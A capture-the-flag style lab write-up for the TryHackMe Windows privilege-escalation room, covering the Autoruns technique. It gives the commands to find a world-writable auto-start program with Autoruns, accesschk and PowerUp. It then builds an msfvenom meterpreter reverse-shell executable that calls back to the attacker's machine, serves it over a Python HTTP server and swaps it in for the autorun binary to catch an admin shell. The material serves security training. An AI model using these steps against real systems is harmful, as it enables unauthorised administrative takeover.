---
description: https://tryhackme.com/room/windowsprivescarena
---

# 🏃‍♂️ Autoruns

###

Autoruns is a powerful utility designed for Windows users to manage and control programs that launch automatically when the computer starts. In simpler terms, it allows you to see and control what applications and services run during your computer's startup process.

<figure><img src="../../../../.gitbook/assets/image (166).png" alt=""><figcaption></figcaption></figure>

### Steps to Identify and Exploit Autorun for Privilege Escalation

Connect via RDP from your Linux to Windows machine :

<figure><img src="../../../../.gitbook/assets/image (399).png" alt=""><figcaption></figcaption></figure>

1. **Run Autoruns64.exe:** Execute `C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe` in an admin command prompt to identify startup programs

at the very top we can see  a file called my program:&#x20;

<figure><img src="../../../../.gitbook/assets/image (400).png" alt=""><figcaption></figcaption></figure>

2. &#x20;**Accesschk for Permissions:** Use `C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"` to check file permissions.&#x20;

Look for broad access, as it can lead to privilege escalation

<figure><img src="../../../../.gitbook/assets/image (401).png" alt=""><figcaption></figcaption></figure>

we are looking for file all access for everyone on a file that automatically runs we can get very malicious as it is possible to make someone run it as admin and then get admin access,&#x20;

3. **PowerUp Analysis:**

* Navigate to `C:\Users\user\Desktop\Tools\PowerUp`.
* Run PowerShell with `powershell -ep bypass`.
* Execute `. .\PowerUp.ps1`.
* Run `Invoke-AllChecks` to identify autorun files and assess permissions

<figure><img src="../../../../.gitbook/assets/image (402).png" alt=""><figcaption></figcaption></figure>

it identifies the autorun file and tells us that everyone has RWX on this file , this is going to come in play soon&#x20;

### Escalation <a href="#lecture_heading" id="lecture_heading"></a>

* **Prepare Kali:**
  * Open two terminals.
  * Launch `msfconsole` in one.
  * Check the IP with `ip a` in the other.
* **Generate Malicious Executable:**
  * Use `msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe -o program.exe` \[4].

This will create a program.exe:&#x20;

<figure><img src="../../../../.gitbook/assets/image (403).png" alt=""><figcaption></figcaption></figure>

On the msfconsole terminal:

<figure><img src="../../../../.gitbook/assets/image (404).png" alt=""><figcaption></figcaption></figure>

Now go back on the other terminal and move the file:

<figure><img src="../../../../.gitbook/assets/image (405).png" alt=""><figcaption></figcaption></figure>

**Host Local Server:**

* Move the executable to the server directory.
* Start a local server with `python -m http.server 4040`.
* **Replace Autorun File:**
  * Fetch the file on the Windows machine via RDP.

<figure><img src="../../../../.gitbook/assets/image (160).png" alt=""><figcaption></figcaption></figure>

Replace the autorun file with the generated malicious executable.

<figure><img src="../../../../.gitbook/assets/image (161).png" alt=""><figcaption></figcaption></figure>

* **Simulate Admin Login:**
  * Disconnect RDP.
  * Reconnect using admin credentials obtained earlier.

<figure><img src="../../../../.gitbook/assets/image (162).png" alt=""><figcaption></figcaption></figure>

This is going to simulate an admin login&#x20;

<figure><img src="../../../../.gitbook/assets/image (163).png" alt=""><figcaption></figcaption></figure>

connect with the admin credentials we got in the intro of this box

* **Exploit Success:**
  * Upon session opening, a pop-up appears.

<figure><img src="../../../../.gitbook/assets/image (164).png" alt=""><figcaption></figcaption></figure>

Check `msfconsole` for a successful shell connection.

<figure><img src="../../../../.gitbook/assets/image (165).png" alt=""><figcaption></figcaption></figure>
